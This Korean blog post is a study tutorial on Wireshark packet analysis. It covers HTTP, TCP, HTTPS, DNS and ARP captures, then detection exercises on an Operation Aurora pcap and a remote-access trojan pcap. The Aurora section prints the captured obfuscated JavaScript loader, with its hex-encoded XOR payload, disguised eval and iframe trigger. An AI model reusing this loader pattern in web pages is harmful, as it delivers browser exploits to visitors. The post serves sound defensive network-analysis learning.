---
layout: post
title: 121227 wireshark를 이용한 패킷분석
comments: true
tags:
- wireshark
- tcp
- udp
- ip
- network
- osi
- study
---

<!-- TOC -->

- [OSI 7 계층](#osi-7-계층)
- [클라이언트와 서버간의 데이타 캡슐화](#클라이언트와-서버간의-데이타-캡슐화)
- [wireshark 설치](#wireshark-설치)
- [wireshark 환경설정](#wireshark-환경설정)
- [실시간패킷분석](#실시간패킷분석)
- [HTTP 패킷분석](#http-패킷분석)
- [TCP 패킷분석](#tcp-패킷분석)
- [HTTPS 패킷분석](#https-패킷분석)
- [UDP 패킷분석 - DNS 요청/응답](#udp-패킷분석---dns-요청응답)
- [DNS 응답](#dns-응답)
- [ARP 패킷분석](#arp-패킷분석)
- [공격탐지#1 - 오퍼레이션 오로라](#공격탐지1---오퍼레이션-오로라)
- [공격탐지#2 - 원격접속 트로이목마](#공격탐지2---원격접속-트로이목마)

<!-- /TOC -->


<br>
<br>
<br>

# OSI 7 계층
| 번호 | 이름 | 역할 | 프로토콜, 네트워크장비 |
|---|---|---|---|
| 7 | 응용 | 사용자에게 네트워크 자원제공 | HTTP, SMTP, FTP, TELNET |
| 6 | 표현 | 데이타의 인코딩/디코딩, 암호화/복호화 | ASCII, MPEG, JPEG, MIDI |
| 5 | 세션 | 세션관리, 연결유지/종료/방향관리 | NetBIOS |
| 4 | 전송 | 신뢰성있는 전송, 흐름제어/분할/재조립/오류관리 | TCP, UDP <br>방화벽, 프록시서버 | 
| 3 | 네트워크 | 네트워크사이의 라우팅, 호스트 주소 관리 | IP <br> 라우터 |
| 2 | 데이터링크 | 물리장비의 주소식별 | 브리지, 스위치 <br> Ethernet, Token Ring, FDDI |
| 1 | 물리 | 물리적 매개체 |   |


# 클라이언트와 서버간의 데이타 캡슐화
- ![](https://s26.postimg.org/mi37q5emx/screenshot_76.png)

# wireshark 설치
- http://www.wireshark.org/download.html

# wireshark 환경설정
- 핵심적인정보만 표시하도록 컬럼추가/삭제
    - Edit > Preferences > User Interface > Columns
    - 아래와 같이 핵심정보만 표시되도록 컬럼추가삭제
- ![](https://s26.postimg.org/bjry7yq1l/screenshot_76.png)

- Coloring Rules 편집
    - View > Coloring Rules
    - 송/수신 패킷을 구분하기 쉽도록 아래와 같이 컬러링룰을 추가
    - ![](https://s26.postimg.org/3tl62tnq1/screenshot_76.png)

# 실시간패킷분석
- 패킷캡쳐준비/시작
    - Capture > Interfaces or 툴바의 인터페이스 캡쳐버튼을 클릭
    - ![](https://s26.postimg.org/scn7k4s49/screenshot_76.png)
    - 캡쳐할 인터페이스 선택 ( 제 경우는 노트북의 무선랜카드를 선택했습니다. )
    - ![](https://s26.postimg.org/ao02695qx/screenshot_76.png)
    - Start 버튼 클릭
- 패킷을 캡쳐하는 동안 네트워크 액션을 수행함.
    - 캡쳐중에 크롬웹브라우져로 네이버뉴스를 몇개 클릭해봄
- 패킷캡쳐종료
    - ![](https://s26.postimg.org/r0a3vzk2h/screenshot_76.png)
- 패킷캡쳐파일저장
    - File > Save as 를 이용하여 test.pcapng 으로 저장
- 컬러링필터 적용
    - 아래와 같이 {my ip address}를 컬러링룰에 적용하여 송신/수신을 구분
    - 파란색이 수신, 빨간색이 송신임.
    - ![](https://s26.postimg.org/b3bbz9ro9/screenshot_76.png)
- 디스플레이 필터 적용
    - ip.addr == {my ip address} 를 적용하여 현재 ip로 송수신된 패킷이 아닌것들을 제거함.
    - ![](https://s26.postimg.org/4qw6pfom1/screenshot_76.png)
- HTTP 요청/응답 확인
    - #66 패킷에서 뉴스기사에 대한 GET 요청확인
    - ![](https://s26.postimg.org/qel4zvp09/screenshot_76.png)
- #68 패킷에서 HTTP 200 OK 응답확인
    - ![](https://s26.postimg.org/5vq8utb2x/screenshot_76.png)


# HTTP 패킷분석
- HTTP 패킷캡쳐
    - 기존에 네이버뉴스기사를 보면서 캡쳐해 두었던 test.pcapng 파일 로드
- HTTP 패킷에 대한 디스플레이 필터를 추가
    - ip.addr == 192.168.6.226 && http
    - http 를 필터조건식에 추가하여 프로토콜이 http만 필터링 되도록함.
- ![](https://s26.postimg.org/hm46c73vd/screenshot_76.png)
- TCP 스트림 시퀀스를 통해 HTTP 요청/응답을 확인
    - 가장 처음으로 나타난 TCP 스트림 확인
        - ![](https://s26.postimg.org/5mso4vyah/screenshot_76.png)
        - ![](https://s26.postimg.org/6qcsguixl/screenshot_76.png)
    - 두번째 스트림 확인
        - tcp.steam eq 1 로 시퀀스번호가 1씩 증가된 것을 확인할 수 있음.
        - ![](https://s26.postimg.org/gb1h0uel5/screenshot_76.png)
        - 위와 같이 tcp.stream 번호를 증가시켜서 순차적인 HTTP 세션을 확인해 나갈수 있음.
    



# TCP 패킷분석
- HTTP 패킷캡쳐
    - 기존에 네이버뉴스기사를 보면서 캡쳐해 두었던 test.pcapng 파일 로드
- TCP 헤더분석
    - ![](https://s26.postimg.org/sqy6ul7x5/screenshot_76.png)
    - #66 패킷에 대한 분석
    - ![](https://s26.postimg.org/wolgjzuqh/screenshot_76.png)

| . | . |
|---|---|
| 발신지포트 | 10941 |
| 목적지포트 | 80 |
| 일련번호 | 1 |
| 확인응답번호 | 1 |
| 플래그 | PSH, ACK | 
| 윈도우크기 | 64240 bytes |
| 체크섬 | 0x4862 |

- HTTP 요청, 응답의 TCP 패킷 시퀀스 분석
    - tcp 패킷만 필터링
    - ![](https://s26.postimg.org/s3za52b15/screenshot_76.png)
- #SEQ, #ACK을 이용해서 전송제어를 계산하는 방법
    - #SEQ = 최근발신패킷의 #SEQ + data length
    - #ACK = 최근수신패킷의 #SEQ + data length
- #SEQ, #ACK 계산과정
    - ![](https://s26.postimg.org/4c3qyrd5l/screenshot_76.png)
        - TCP 3-way handshake 분석 : #63 ~ #65
        - TCP 데이타 송수신 : #66 ~ #68
        - TCP 4-way teardown 분석 : #69 ~ #72


# HTTPS 패킷분석
- HTTPS 패킷캡쳐
    - 크롬웹브라우져를 시작하면서 구글에 자동로그인할때 발생하는 패킷캡쳐
    - ![](https://s26.postimg.org/qld2rkj89/screenshot_76.png)
- 디스플레이 필터 설정
    - tcp.port == 443 && ip.addr == 74.125.128.120
    - HTTPS 표준포트는 443 이므로 이 포트만 필터링
    - 여러서버에 요청을 하기 때문에 HTTPS 시퀀스 분석이 용이하게 74.125.128.120 서버와 통신했던 내역을 필터링
- HTTPS 통신 시퀀스
    - ![](https://s26.postimg.org/yqzq3gwux/screenshot_76.png)


# UDP 패킷분석 - DNS 요청/응답
- DNS 패킷캡쳐
    - 노트북의 인터넷을 OFF 했다가 ON 하고나서 크롬웹브라우져로 구글검색을 시도하는 시나리오.
    - 가장먼저 DNS 요청을 보내서 각 hostname을 ip address로 resolve하는 과정을 거치게 됨.
    - DNS 요청/응답은 udp 패킷이며 port는 53이므로 필터식은 udp && udp.port == 53 가 됨.
    - ![](https://s26.postimg.org/jyv0c4qxl/screenshot_76.png)
- UDP 패킷헤더
    - ![](https://s26.postimg.org/c7eadkms9/screenshot_76.png)
- DNS 요청
    - ![](https://s26.postimg.org/rhe5kriah/screenshot_76.png)

| . | . |
|---|---|
| 패킷번호 | 19 |
| DNS 패킷 타입 | 요청 |
| NS 패킷 내용 | dns.msftncsi.com 의 ip address는 무엇인가? |



# DNS 응답
![](https://s26.postimg.org/wjvhfjrkp/screenshot_76.png)

| . | . |
|---|---|
| 패킷번호 | 22 |
| DNS 패킷 타입 | |응답 |
| DNS 패킷 내용 | dns.msftncsi.com 의 ip address는 131.107.255.255 입니다. |



# ARP 패킷분석
- ARP 패킷캡쳐
    - 노트북의 인터넷을 OFF 했다가 ON 하고나서 크롬웹브라우져로 구글검색을 시도하는 시나리오.
    - 각 ip address에 해당하는 mac address를 검색하기 위해서 요청하고, 해당 ip address를 갖는 호스트는 자신의 mac address를 포함하여 응답함.
    - ![](https://s26.postimg.org/3k5odayc9/screenshot_76.png)
    - 필터식은 arp 프로토콜을 그대로 적어준다.
    - ![](https://s26.postimg.org/o5kg57fx5/screenshot_76.png)
- ARP 요청
    - ![](https://s26.postimg.org/641b7elw9/screenshot_76.png)

| . | . |
|---|---|
| #패킷번호 | 2 |
| ARP 타입 | ARP 요청 |
| 송신자 mac | 10:0b... |
| 송신자 ip | 192.168.6.226 |
| 내용 | 192.168.4.1 의 mac 은 무엇인가? |

- ARP 응답
     - ![](https://s26.postimg.org/jni5d3zvd/screenshot_76.png)

| . | . |
|---|---|
| #패킷번호 | 3 |
| ARP 타입 | ARP 응답 |
| 송신자 mac | a8:d0... |
| 송신자 ip | 192.168.4.1 |
| 내용 | 192.168.4.1 의 mac 은 a8:d0... 입니다. |


# 공격탐지#1 - 오퍼레이션 오로라
- 2010년 1월 버전 IE의 취약점을 이용한 원격루트제어 획득
- 희생자 PC에서 캡쳐한 pcap 로드
    - aurora.pcap
        - ![](https://s26.postimg.org/jos36j1p5/screenshot_76.png)
    - 첫번째 요청/응답
        - ![](https://s26.postimg.org/584tryc7t/screenshot_76.png)
    - 두번째 요청/응답
        
```html
GET /info?rFfWELUjLJHpP HTTP/1.1
Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*
Accept-Language: en-us
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
Host: 192.168.100.202
Connection: Keep-Alive
   
HTTP/1.1 200 OK
Content-Type: text/html
Pragma: no-cache
Connection: Keep-Alive
Server: Apache
Content-Length: 11266
   
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN">
<html>
<head>
<script>
..var IwpVuiFqihVySoJStwXmT = '04271477133b000b1a0c240339133c120e2805160e1503684d705005291a08091b3e6e713e1122520b03123d051808392c0d27123b0a0805033c1c073532
...
3b0233372a033a2022215131';
..var RXb = '';
..for (i = 0;i<IwpVuiFqihVySoJStwXmT.length;i+=2) {
...RXb += String.fromCharCode(parseInt(IwpVuiFqihVySoJStwXmT.substring(i, i+2), 16));
..}
..var vuWGWsvUonxrQzpqgBXPrZNSKRGee = location.search.substring(1);
..var NqxAXnnXiILOBMwVnKoqnbp = '';
..for (i=0;i<RXb.length;i++) {
...NqxAXnnXiILOBMwVnKoqnbp += String.fromCharCode(RXb.charCodeAt(i) ^ vuWGWsvUonxrQzpqgBXPrZNSKRGee.charCodeAt(i%vuWGWsvUonxrQzpqgBXPrZNSKRGee.length));
..}
..window["eval".replace(/[A-Z]/g,"")](NqxAXnnXiILOBMwVnKoqnbp);
   
</script>
</head>
<body>
<span id="vhQYFCtoDnOzUOuxAflDSzVMIHYhjJojAOCHNZtQdlxSPFUeEthCGdRtiIY"><iframe src="/infowTVeeGDYJWNfsrdrvXiYApnuPoCMjRrSZuKtbVgwuZCXwxKjtEclbPuJPPctcflhsttMRrSyxl.gif" onload="WisgEgTNEfaONekEqaMyAUALLMYW(event)" /></span></body></html>
</body>
</html>
```

    - 공격자사이트#2가 위장된 javascript 코드와 iframe에 쌓여있는 GIF 이미지 응답

- 세번째 요청/응답
    - ![](https://s26.postimg.org/ccmn0zjh5/screenshot_76.png)
        - 희생자는 GIF 이미지에 GET 요청
        - 희생자PC에서 GIF 이미지가 위장된 javascript 코드와 결합하여 실행됨.
- 네번째, 다섯번째 요청/응답
    - ![](https://s26.postimg.org/ewmv8twex/screenshot_76.png)
        - 희생자PC와 공격자서버가 새로운 TCP 세션을 생성
        - 희생자는 이 세션으로 셸 정보를 전송






# 공격탐지#2 - 원격접속 트로이목마
- 희생자 PC에서 캡쳐한 pcap 로드
    - ratinfected.pcap
        - ![](https://s26.postimg.org/uje4m7a6x/screenshot_76.png)
- 첫번째 TCP 스트림 분석
    - 희생자가 자신의 OS 스펙을 공격자로 전송하고 있음.
        - ![](https://s26.postimg.org/4p4bwfa6x/screenshot_76.png)
- 두번째 TCP 스트림 분석
- 세번째 TCP 스트림 분석
    - 희생자가 공격자에게 대용량 데이타 전송을 수행했음.
    - jpgevhook 이란 단어로 보아 데이타의 내용은 이미지파일인가?
        - ![](https://s26.postimg.org/le5rsc6s9/screenshot_76.png)
- 세번째 스트림의 내용을 파일로 저장
    - troy.dat 로 저장
    - ![](https://s26.postimg.org/54flpfw49/screenshot_76.png)
- winhex를 이용해서 이미지헤더가 아닌것 같은 부분을 살살 잘라냄.
    - ![](https://s26.postimg.org/67zq1egrd/screenshot_76.png)
- troy.dat를 그림판으로 오픈
    - 희생자의 PC가 계속 화면캡쳐당했고, 캡쳐된 이미지가 서버로 전송되고 있음.
    - ![](https://s26.postimg.org/whksk72op/screenshot_76.png)

